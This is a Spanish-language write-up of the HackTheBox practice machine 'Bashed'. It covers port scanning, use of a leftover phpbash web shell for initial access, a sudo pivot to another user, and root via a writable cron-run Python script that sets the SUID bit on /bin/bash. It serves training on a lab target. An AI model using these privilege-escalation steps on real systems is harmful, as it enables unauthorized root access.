---
title: "Bashed - HTB Writeup"
layout: single
excerpt: "Bashed es una máquina de nivel fácil de HackTheBox. En esta máquina hacemos uso de una utilidad llamada _Phpbash_ que permite ejecutar comandos en el sistema a través de una shell emulada con php. Escalamos privilegios abusando de una tarea cron realizada por el usuario root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/129729480-04eb84e5-b57f-43d9-838f-e85f83070412.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Phpbash
  - Sudo
  - cronjob
  - Linux
---

![titulo](https://user-images.githubusercontent.com/67548295/129729717-8d6d4323-18ac-49fa-ba3d-6bdb1956df8f.png)

# Enumeración

Comenzamos como siempre, enviando una traza por ICMP para ver si la máquina se encuentra activa y para identificar el OS:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.10.68
PING 10.10.10.68 (10.10.10.68) 56(84) bytes of data.
64 bytes from 10.10.10.68: icmp_seq=1 ttl=63 time=64.3 ms

--- 10.10.10.68 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 64.321/64.321/64.321/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está activa y que observando el TTL, concluimos que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Empezamos con la fase de escaneo de puertos, haremos uso de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -v -n 10.10.10.68 -sC -sV -oN targeted

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 14:01 WEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating Ping Scan at 14:01
Scanning 10.10.10.68 [4 ports]
Completed Ping Scan at 14:01, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:01
Scanning 10.10.10.68 [65535 ports]
Discovered open port 80/tcp on 10.10.10.68
Completed SYN Stealth Scan at 14:02, 15.63s elapsed (65535 total ports)NSE: Script scanning 10.10.10.68.
Initiating NSE at 14:02
Nmap scan report for 10.10.10.68
Host is up (0.063s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds
Raw packets sent: 65548 (2.884MB) | Rcvd: 65545 (2.622MB)
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | envía paquetes tan o más rápido que la tasa dada. |
| `-v` | Especifica que queremos más 'verbose', es decir, que nos muestre mas información de la convencional. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

y vemos que solo hay un puerto abierto:

| puerto | servicio |
|:------:|:--------:|
| 80 | HTTP → Normalmente corresponde a que hay una web alojada. |

Para hacer una enumeración rápida de directorios que pudieran haber en el servidor web, voy a utilizar un _script de nmap_ que se llama `http-enum`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ nmap --script http-enum -p80 10.10.10.68 -oN webScan
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 14:09 WEST
Nmap scan report for 10.10.10.68
Host is up (0.064s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `--script http-enum` | Indicamos que queremos utilizar el script http-enum. |
| `-p80` | Indicamos que queremos hacer acciones únicamente con el puerto 80 del host. |
| `-oN [Nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

# User.txt

Ya que medianamente hemos enumerado un poco el puerto 80, vamos a visitar la web con el navegador:

![navegador1](https://user-images.githubusercontent.com/67548295/129732205-58100273-a140-4f78-b097-d3007390cca2.png)

Parece ser un blog.

Veo que hay un artículo sobre algo llamado `phpbash`, accedemos para ver más en detalle:

![navegador2](https://user-images.githubusercontent.com/67548295/129732532-c5933e77-09d9-4651-9a11-8d70c45c56a1.png)

Y vemos que habla de una utilidad que permite emular una consola con php.

Después de esto, procedo a enumerar los directorios que me había enumerado el script de nmap, empiezo por el directorio `dev`:

![navegador3](https://user-images.githubusercontent.com/67548295/129732917-a64d4603-7a32-452a-adc4-cf9a63186bf8.png)

¡Que sopresa! Se ve que el usuario que administra el blog ha estado probando la utilidad de la que hablaba en un post y se ha olvidado de borrarla.

Accedo a `phpbash.php` para ver si era la utilidad realmente y...

![navegador4](https://user-images.githubusercontent.com/67548295/129733409-bd857b3a-1d58-4068-a448-32d33c06ea10.png)

Vaya pues sí, es el recurso.

Pruebo a obtener acceso al sistema mediante un servidor en python que aloje una reverse shell y lo conseguimos:

![navegador5](https://user-images.githubusercontent.com/67548295/129738274-f123c836-c7e4-4cc8-a61b-ad4e6c43d255.png)

Podemos ver la flag de user como usuario `www-data` en /home/arrexel/user.txt

```bash
bash-4.3$ cat /home/arrexel/user.txt

2c2XXXXXXXXXXXXXXXXXXXXXXc1
```

# Root.txt

Empiezo enumerando el sistema como usuario `www-data` y me percato de que puedo ejecutar cualquier comando como el usuario `scriptmanager`:

```bash
bash-4.3$ whoami 
www-data
bash-4.3$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

| Parámetro | Acción |
|:---------:|:------:|
| `-l` | listamos los comandos permitidos y prohibidos para ejecutar como otro usuario |

Con esto es muy facil convertirse en este usuario, basta con hacer lo siguiente:

```bash
bash-4.3$ sudo -u scriptmanager /bin/bash
bash-4.3$ whoami
scriptmanager
```

| Parámetro | Acción |
|:---------:|:------:|
| `-u [comando]` | Especificamos el usuario con el cual se ejecutará el comando|

Una vez nos hemos convertido en usuario `scriptmanager` sigo enumerando el sistema en busca de algún vector para convertirnos en root.

Pruebo a hacer uso de la utilidad `find` para buscar archivos o directorios que sean propiedad de este usuario.

```bash
bash-4.3$ find / -user scriptmanager 2>/dev/null | grep -v "proc"
/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

| Parámetro | Acción |
|:---------:|:------:|
| `/` | Queremos hacer la busqueda recursiva desde la raiz (en todo el sistema) |
| `-user [usuario]` | Buscamos archivos y directios que sean propiedad del usuario pasado por parámetro |
| `2>/dev/null` | enviamos los errores a /dev/null (para que no los muestre) que es un archivo especial para esto mismo |

| Parámetro | Acción |
|:---------:|:------:|
| `-v` | hacemos que no muestre los matches |

Vemos que hay un directorio poco comun en la raiz del sistema con nombre `scripts`

Voy a ver que contiene y veo que hay 2 archivos:

```bash
bash-4.3$ ls   
test.py  test.txt
```
Hay un script en python y un archivo de texto.

Inspecciono el script de python y el archivo de texto:

```bash
bash-4.3$ cat test.py

f = open("test.txt", "w")
f.write("testing 123!")
f.close

bash-4.3$ cat test.txt
testing 123!
```
Este script lo que hace es crear un archivo test.txt y escribir dentro "testing 123!"

Por ahora nada raro.

Pruebo a hacer un `ls -la` para ver los permisos de los archivos:

```bash
bash-4.3$ ls -lah
total 16K
drwxrwxr--  2 scriptmanager scriptmanager 4.0K Aug 17 07:48 .
drwxr-xr-x 23 root          root          4.0K Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Aug 17 07:48 test.py
-rw-r--r--  1 root          root            12 Aug 17 07:49 test.txt
```

Viendo esto, supongo que root tiene una tarea cron que ejecuta el script `test.py` a intervalos de tiempo,ya que el archivo que se generó a través del script es propiedad de root.

Al tener permisos de escritura en el script de python, ya la escalada de privilegios está asegurada.

Podriamos editar `test.py` con lo siguiente:

```python
import os

os.system("chmod u+s /bin/bash")
```
una vez hecho esto esperamos hasta que la tarea cron se ejecute, y ya podremos hacer un `bash -p` y convertirnos en root

```bash
bash-4.3$ bash -p
bash-4.3# whoami
root
```

Ya en este punto podremos ver la flag de root en /root/root.txt

```bash
bash-4.3# cat /root/root.txt 
cc4XXXXXXXXXXXXXXXXXXXXXXXXXXe2
```

# Resumen

En esta máquina hacemos uso de una utilidad que emulaba una shell en el servidor web para acceder al sistema, nos convertimos en el usuario `scriptmanager` con un permiso
de sudoers que nos permitía ejecutar cualquier comando como el usuario `scriptmanger`. Por último, nos convertimos en usuario root aprovechando una tarea cron que ejecutaba un
script en python que nosotros podíamos manipular.
